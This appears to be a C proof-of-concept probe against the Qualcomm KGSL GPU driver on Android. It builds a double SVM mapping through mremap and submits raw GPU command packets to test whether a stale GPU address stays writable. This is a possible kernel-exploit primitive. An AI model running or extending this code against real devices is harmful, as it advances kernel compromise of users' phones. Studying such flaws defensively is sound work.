/* kgsl-svmdual.c — after the deterministic double-region, which SVM gpuaddr is
 * still GPU-reachable?
 *
 * Builds two SVM regions on one entry (G1 via mmap#1, G2 via mmap#2 after an
 * mremap-shrink), then CP-writes G1, G2 and a non-SVM marker, and reads back the
 * CPU aliases v1 (head, 1 page) and v2 (2 pages).
 *
 * Build: zig cc -target arm-linux-musleabihf -static -O2 -w -Wl,--strip-all
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define DEV "/dev/kgsl-3d0"
#define USE_CPU_MAP 0x10000000ULL

struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpuobj_alloc { uint64_t size, flags, va_len, mmapsize; unsigned int id, metadata_len; uint64_t metadata; };
struct kgsl_gpuobj_info  { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
struct kgsl_drawctxt_create { unsigned int flags, drawctxt_id; };
struct kgsl_drawctxt_destroy { unsigned int drawctxt_id; };
struct kgsl_command_object { uint64_t offset, gpuaddr, size; unsigned int flags, id; };
struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs, context_id, timestamp;
};
#define IOCTL_CTXT_CREATE   _IOWR(KGSL_IOC_TYPE,0x13,struct kgsl_drawctxt_create)
#define IOCTL_CTXT_DESTROY  _IOW (KGSL_IOC_TYPE,0x14,struct kgsl_drawctxt_destroy)
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_GPUOBJ_ALLOC  _IOWR(KGSL_IOC_TYPE,0x45,struct kgsl_gpuobj_alloc)
#define IOCTL_GPUOBJ_INFO   _IOWR(KGSL_IOC_TYPE,0x47,struct kgsl_gpuobj_info)
#define IOCTL_GPU_COMMAND   _IOWR(KGSL_IOC_TYPE,0x4A,struct kgsl_gpu_command)
#define KGSL_CONTEXT_PREAMBLE 0x10
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x2
#define KGSL_CMDBATCH_MEMLIST 0x1
#define KGSL_CMDLIST_IB 0x1
#define KGSL_OBJLIST_MEMOBJ 0x8
#define CP_MEM_WRITE 0x3d

static int fd;
static void on_alarm(int s){ (void)s; write(1,"[!] alarm\n",10); _exit(0x42); }
static unsigned int parity(unsigned int v){ v^=v>>16; v^=v>>8; v^=v>>4; v&=0xf; return (0x9669u>>v)&1; }
static unsigned int t7(unsigned int op,unsigned int cnt){ cnt&=0x3fff;op&=0x7f; return (7u<<28)|cnt|(parity(cnt)<<15)|(op<<16)|(parity(op)<<23); }
static unsigned int *put_addr(unsigned int *p,uint64_t a){ *p++=(unsigned)a; *p++=(unsigned)(a>>32); return p; }

int main(void){
    setvbuf(stdout,NULL,_IONBF,0);
    signal(SIGALRM,on_alarm); alarm(50);
    printf("== kgsl SVM dual-region CP test (uid=%d) ==\n",(int)getuid());
    fd=open(DEV,O_RDWR); if(fd<0){ printf("[-] open: %s\n",strerror(errno)); return 1; }

    struct kgsl_gpumem_alloc_id ca; memset(&ca,0,sizeof ca); ca.size=0x10000;
    ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ca);
    uint32_t *cmd=mmap(NULL,0x10000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)ca.id<<12);
    if(cmd==MAP_FAILED){ printf("[-] mmap cmd: %s\n",strerror(errno)); return 1; }
    memset(cmd,0,0x10000);
    struct kgsl_gpumem_alloc_id ma; memset(&ma,0,sizeof ma); ma.size=0x1000;
    ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ma);
    uint32_t *mark=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)ma.id<<12);
    struct kgsl_drawctxt_create cc; memset(&cc,0,sizeof cc);
    cc.flags=KGSL_CONTEXT_PREAMBLE|KGSL_CONTEXT_NO_GMEM_ALLOC;
    ioctl(fd,IOCTL_CTXT_CREATE,&cc);

    /* double region on E */
    struct kgsl_gpuobj_alloc sa; memset(&sa,0,sizeof sa);
    sa.size=0x2000; sa.flags=USE_CPU_MAP; sa.va_len=0x2000;
    if(ioctl(fd,IOCTL_GPUOBJ_ALLOC,&sa)<0){ printf("[-] svm alloc: %s\n",strerror(errno)); return 1; }
    struct kgsl_gpuobj_info si; memset(&si,0,sizeof si); si.id=sa.id;
    void *v1=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)sa.id<<12);
    ioctl(fd,IOCTL_GPUOBJ_INFO,&si); unsigned long long G1=si.gpuaddr;
    ((uint32_t*)v1)[0]=0x11111111u;
    void *m=mremap(v1,0x2000,0x1000,0); if(m!=MAP_FAILED) v1=m;
    ioctl(fd,IOCTL_GPUOBJ_INFO,&si);
    void *v2=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)sa.id<<12);
    ioctl(fd,IOCTL_GPUOBJ_INFO,&si); unsigned long long G2=si.gpuaddr;
    ((uint32_t*)v2)[0]=0x22222222u;
    printf("[1] E id=%u G1=0x%llx G2=0x%llx v1=%p v2=%p\n",sa.id,G1,G2,v1,v2);

    /* CP writes: G1, G2, marker */
    uint32_t *p=cmd; mark[0]=0;
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,G1);        *p++=0xA1A1A1A1u;
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,G2);        *p++=0xB2B2B2B2u;
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,ma.gpuaddr);*p++=0xC3C3C3C3u;
    int ndw=(int)(p-cmd);
    struct kgsl_command_object cob; memset(&cob,0,sizeof cob);
    cob.gpuaddr=ca.gpuaddr; cob.size=(uint64_t)ndw*4; cob.flags=KGSL_CMDLIST_IB;
    struct kgsl_command_object mo; memset(&mo,0,sizeof mo);
    mo.gpuaddr=ca.gpuaddr; mo.size=0x10000; mo.flags=KGSL_OBJLIST_MEMOBJ; mo.id=ca.id;
    struct kgsl_gpu_command gc; memset(&gc,0,sizeof gc);
    gc.flags=KGSL_CMDBATCH_MEMLIST; gc.context_id=cc.drawctxt_id;
    gc.cmdlist=(uint64_t)(uintptr_t)&cob; gc.cmdsize=sizeof cob; gc.numcmds=1;
    gc.objlist=(uint64_t)(uintptr_t)&mo; gc.objsize=sizeof mo; gc.numobjs=1;
    errno=0; int r=ioctl(fd,IOCTL_GPU_COMMAND,&gc);
    usleep(300000);
    printf("[2] submit rc=%d errno=%d\n",r,errno);
    printf("    G1 alias v1[0]=0x%08x %s\n",((uint32_t*)v1)[0],
           ((uint32_t*)v1)[0]==0xA1A1A1A1u?"<<< G1 STILL MAPPED FOR GPU":"(G1 write did NOT land)");
    printf("    G2 alias v2[0]=0x%08x %s\n",((uint32_t*)v2)[0],
           ((uint32_t*)v2)[0]==0xB2B2B2B2u?"<<< G2 mapped":"(G2 write did NOT land)");
    printf("    marker   mark=0x%08x %s\n",mark[0],
           mark[0]==0xC3C3C3C3u?"(CP alive)":"(CP faulted at/after G1)");

    /* tail page of G2 via v2[0x1000/4] */
    printf("    v2+0x1000[0]=0x%08x\n",((uint32_t*)v2)[0x400]);

    { struct kgsl_drawctxt_destroy x={cc.drawctxt_id}; ioctl(fd,IOCTL_CTXT_DESTROY,&x); }
    printf("== done ==\n");
    return 0;
}
